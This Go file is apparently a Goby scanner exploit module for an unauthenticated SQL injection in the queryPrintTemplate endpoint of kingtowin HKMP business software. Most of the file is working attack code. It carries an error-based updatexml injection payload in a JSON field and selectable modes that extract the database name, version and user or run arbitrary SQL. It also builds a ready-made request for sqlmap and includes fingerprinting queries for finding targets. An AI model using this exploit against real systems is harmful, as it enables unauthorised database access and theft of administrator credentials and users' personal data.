package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "kingtowin-HKMP /queryPrintTemplate  SQL Injection Vulnerability",
    "Description": "<p>Jindouyun smart business software is a powerful, easy-to-use smart management system, through intelligent management tools, to help enterprises achieve efficient operation, optimize processes, reduce costs, and improve customer experience.</p><p>There is a SQL injection vulnerability in the queryPrintTemplate interface of Jindouyun HKMP smart business software, which allows an unauthenticated remote attacker to exploit the vulnerability to obtain information in the database (for example, administrator background password, site user personal information), and even write Trojans to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Product": "kingtowin-HKMP",
    "Homepage": "https://kingtowin.com/index.jsp",
    "DisclosureDate": "2024-08-19",
    "PostTime": "2024-09-01",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"lib/layui/layui.js\" && body=\"js/web.js\" && body=\"js/common.js\"",
    "GobyQuery": "body=\"lib/layui/layui.js\" && body=\"js/web.js\" && body=\"js/common.js\"",
    "Level": "1",
    "Impact": "<p>There is a SQL injection vulnerability in the queryPrintTemplate interface of Jindouyun HKMP smart business software, which allows an unauthenticated remote attacker to exploit the vulnerability to obtain information in the database (for example, administrator background password, site user personal information), and even write Trojans to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/141233761"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select 111*6",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "金斗云 HKMP智慧商业软件 /queryPrintTemplate SQL 注入漏洞",
            "Product": "金斗云-HKMP",
            "Description": "<p>金斗云智慧商业软件是一款功能强大、易于使用的智慧管理系统，通过智能化的管理工具，帮助企业实现高效经营、优化流程、降低成本，并提升客户体验。<br></p><p>金斗云 HKMP智慧商业软件&nbsp;queryPrintTemplate 接口存在SQL注入漏洞，未经身份验证的远程攻击者可利用漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>金斗云 HKMP智慧商业软件&nbsp;queryPrintTemplate 接口存在SQL注入漏洞，未经身份验证的远程攻击者可利用漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "kingtowin-HKMP /queryPrintTemplate  SQL Injection Vulnerability",
            "Product": "kingtowin-HKMP",
            "Description": "<p>Jindouyun smart business software is a powerful, easy-to-use smart management system, through intelligent management tools, to help enterprises achieve efficient operation, optimize processes, reduce costs, and improve customer experience.</p><p>There is a SQL injection vulnerability in the queryPrintTemplate interface of Jindouyun HKMP smart business software, which allows an unauthenticated remote attacker to exploit the vulnerability to obtain information in the database (for example, administrator background password, site user personal information), and even write Trojans to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in the queryPrintTemplate interface of Jindouyun HKMP smart business software, which allows an unauthenticated remote attacker to exploit the vulnerability to obtain information in the database (for example, administrator background password, site user personal information), and even write Trojans to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9950"
}`
	setSqlPayloadHashCDSUJNIDFHUSYUIDSAYHIFBWSEYHGEDFJC := func(hostInfo *httpclient.FixUrl, sql string) (res string, vulurl string, err error) {
		//配置漏洞存在的路径
		vulurl = "/admin/configApp/queryPrintTemplate"
		requestConfig := httpclient.NewPostRequestConfig(vulurl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Header.Store("Content-Type", "application/json")
		requestConfig.Data = `{"appId":"hkmp","data":{"appName":"悟空POS Win版' AND (updatexml(1,concat(0x7e7e,(` + sql + `),0x7e7e),1)) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}`
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = fmt.Errorf("fail")
			return "", "", err
		}
		res = resp.RawBody
		return res, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "14186586"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "select 5469*2594"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `~~([\s\S]*?)~~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashCDSUJNIDFHUSYUIDSAYHIFBWSEYHGEDFJC
			res, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(res, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /admin/configApp/queryPrintTemplate HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
Content-Type: application/json
 
{"appId":"hkmp","data":{"appName":"悟空POS Win版' AND (updatexml(1,concat(0x7e7e,(select 5469*2594),0x7e7e),1)) and 'zz'='zz","configGroup":"1","mchId":"0001"},"deviceId":"hkmp","mchId":"hkmp","nonce":3621722933,"sign":"hkmp","timestamp":1719306504}`

			// 3.配置正则语句，从响应包中提取出数据
			regular := `~~([\s\S]*?)~~`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashCDSUJNIDFHUSYUIDSAYHIFBWSEYHGEDFJC
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "SELECT DATABASE()"
					} else if way == "db_version" {
						sql = "SELECT VERSION()"
					} else if way == "user_name" {
						sql = "SELECT USER()"
					}
				}
				res, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(res, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = res
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
